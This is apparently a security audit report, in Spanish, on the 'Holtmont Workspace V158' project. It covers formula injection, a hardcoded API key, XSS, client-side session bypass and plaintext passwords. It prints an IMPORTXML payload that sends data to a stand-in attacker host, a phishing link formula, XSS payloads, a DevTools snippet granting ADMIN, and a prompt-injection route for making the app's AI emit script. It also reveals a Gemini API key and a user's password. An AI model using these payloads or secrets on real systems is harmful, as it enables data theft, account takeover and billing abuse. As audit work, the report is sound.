# Informe de Seguridad - Vulnerabilidades Críticas (OWASP Top 10)

## Resumen Ejecutivo
Este informe detalla las vulnerabilidades críticas encontradas en el proyecto "Holtmont Workspace V158". Las vulnerabilidades abarcan varias categorías del OWASP Top 10, y su explotación podría resultar en la pérdida de confidencialidad, integridad y disponibilidad de la información, además de comprometer la ejecución de código en el backend (Google Apps Script).

---

## 1. Vulnerabilidades en Google Sheets / Apps Script (Equivalente a Inyección SQL)
**Categoría OWASP:** A03:2021-Injection (Inyección de Fórmulas / Formula Injection)

### Descripción
El sistema utiliza Google Sheets como base de datos principal, interactuando tanto desde Python (FastAPI/gspread) como mediante Google Apps Script (`CODIGO.js`).
La vulnerabilidad principal radica en la inserción directa de datos del usuario en las hojas de cálculo sin ninguna sanitización previa.

### Vector de Ataque
Dado que no existe una base de datos SQL tradicional, el vector de inyección equivalente y más crítico aquí es la **Inyección de Fórmulas CSV/Spreadsheet (CSV Injection / Formula Injection)**.
Si un usuario introduce un dato que comienza con `=`, `+`, `-` o `@` en los campos del frontend (por ejemplo, en "Descripción", "Concepto" o cualquier otro campo de texto), Google Sheets interpretará este texto como una fórmula cuando el script `appendRow` (en `CODIGO.js` o `sheets.py`) inserte la fila.

Un atacante podría inyectar fórmulas maliciosas como:
*   `=IMPORTXML("http://servidor-atacante.com/robar?datos="&A1, "//a")`: Para exfiltrar datos de otras celdas hacia un servidor externo.
*   `=HYPERLINK("http://phishing.com", "Haz clic aquí")`: Para engañar a otros usuarios (Phishing).
*   Llamadas a funciones de Google Finance u otras que pueden ralentizar o bloquear la hoja.

### Ubicación del código afectado
*   **`CODIGO.js`**: Múltiples instancias de `sheet.appendRow(values);` y `sheet.getRange(...).setValues(rows);` donde `rows` proviene directamente de las peticiones de la API o frontend.
*   **`api/services/sheets.py`**: Uso de `sheet.append_row(values)` sin sanitizar los elementos de `values`.

### Impacto
*   **Crítico.** Exfiltración de datos confidenciales del proyecto (costos, clientes, datos personales), ataques de phishing a empleados, y potencial denegación de servicio de la hoja de cálculo.

---

## 2. Exposición de Claves API Hardcodeadas
**Categoría OWASP:** A07:2021-Identification and Authentication Failures / A05:2021-Security Misconfiguration

### Descripción
El código fuente contiene una clave de API de Google (Gemini) expuesta directamente en el archivo `CODIGO.js`.

### Ubicación del código afectado
*   **`CODIGO.js`** (Línea ~650, Función `transcribirConGemini`):
    ```javascript
    const API_KEY = "AIzaSyA7Lv551Quq7lMCynU7kRq9T1_MIaK6kkc";
    ```

### Impacto
*   **Alto/Crítico.** Un atacante que tenga acceso al código fuente, o si el archivo `CODIGO.js` es expuesto accidentalmente (como suele ocurrir en repositorios públicos o mediante inspección de elementos si se sirve al cliente, aunque en GAS corre en servidor), puede extraer esta clave y usarla para consumir la cuota de la API de Google Gemini a cuenta de la organización, incurriendo en gastos imprevistos y agotamiento de recursos (Denial of Wallet).

---

## 3. Cross-Site Scripting (XSS)
**Categoría OWASP:** A03:2021-Injection (Específicamente XSS)

### Descripción
En el frontend (desarrollado con Vue 3), se utiliza la directiva `v-html` para renderizar contenido HTML que proviene de respuestas de la IA (backend).

### Ubicación del código afectado
*   **`index.html`** y **`workorder_form.html`** (varias instancias):
    ```html
    <div v-html="formattedEngineeringQuestions" class="markdown-content" v-if="engineeringQuestions"></div>
    ```

### Vector de Ataque
La variable `formattedEngineeringQuestions` toma el texto generado por la IA (Groq/Gemini) y le aplica reemplazos simples mediante expresiones regulares (Regex) para convertir Markdown a HTML.
```javascript
const formattedEngineeringQuestions = computed(() => {
    if (!engineeringQuestions.value) return '';
    let html = engineeringQuestions.value;
    html = html.replace(/^### (.*$)/gim, '<h6>$1</h6>');
    // ... otros reemplazos ...
    return html;
});
```
Si un atacante logra manipular el prompt de entrada (Prompt Injection en el audio o descripción) para que la IA devuelva un script malicioso (ej. `<script>alert('XSS')</script>` o `<img src=x onerror=alert(1)>`), este texto pasará los reemplazos regex sin alteraciones y será insertado directamente en el DOM del usuario que esté visualizando la aplicación, ejecutando el código malicioso en su navegador.

### Impacto
*   **Alto.** Robo de sesiones, redirecciones maliciosas, modificación del DOM para engañar a los usuarios, y ejecución de acciones no autorizadas en nombre de la víctima.

---

## 4. Gestión de Sesiones Insegura y Control de Acceso Roto
**Categoría OWASP:** A01:2021-Broken Access Control / A07:2021-Identification and Authentication Failures

### Descripción
El sistema implementa un mecanismo de "login" que verifica las credenciales consultando una hoja de cálculo (`USERS`) a través del backend FastAPI. Sin embargo, la gestión de la sesión post-login se delega completamente al frontend (Vue.js).

### Ubicación del código afectado
*   **`index.html`** (Lógica de Vue):
    ```javascript
    const doLogin = () => {
        // ...
        google.script.run.withSuccessHandler(res => {
            if(res.success){
                isLoggedIn.value=true;
                currentUser.value=res.name;
                currentRole.value = res.role;
                // ...
            }
        }).apiLogin(loginUser.value, loginPass.value);
    };
    ```
*   **`api/main.py`**: El endpoint `/api/login` valida contraseñas en texto plano (ver punto 5) y devuelve un éxito sin emitir ningún token criptográfico (JWT, cookies seguras o sesiones del servidor).

### Vector de Ataque
Como la autorización depende de variables reactivas locales (`isLoggedIn`, `currentRole`), un atacante con acceso a la aplicación puede simplemente abrir las herramientas de desarrollador del navegador (DevTools) e inyectar el estado deseado:
```javascript
const app = document.querySelector('#app').__vue_app__._instance.proxy;
app.isLoggedIn = true;
app.currentRole = 'ADMIN';
```
Dado que los endpoints del backend (`/api/savePPC`, `/api/data`, etc.) no validan ningún token de autenticación del lado del servidor, aceptarán cualquier petición enviada desde el cliente, permitiendo a cualquier usuario (incluso no autenticado) leer y escribir datos en las hojas de cálculo.

### Impacto
*   **Crítico.** Bypass completo de la autenticación. Cualquier persona puede elevar sus privilegios a administrador, leer información confidencial, y modificar o borrar registros críticos del proyecto.

---

## 5. Almacenamiento de Contraseñas en Texto Plano
**Categoría OWASP:** A02:2021-Cryptographic Failures

### Descripción
El sistema valida y almacena contraseñas en texto plano.

### Ubicación del código afectado
*   **`api/main.py`**:
    ```python
    if len(row) > pass_idx and row[pass_idx] == creds.password:
    # Y también en el mock DB:
    "LUIS_CARLOS": {"pass": "admin2025", "role": "ADMIN", ...}
    ```

### Impacto
*   **Alto.** Si la base de datos (Google Sheet "USERS") se ve comprometida (por ejemplo, mediante una inyección de fórmulas que exfiltre la hoja, o por un error de permisos en Drive), todas las contraseñas de los usuarios quedan expuestas inmediatamente, lo que puede llevar a ataques de relleno de credenciales (credential stuffing) si los empleados reutilizan sus contraseñas en otros servicios.

---
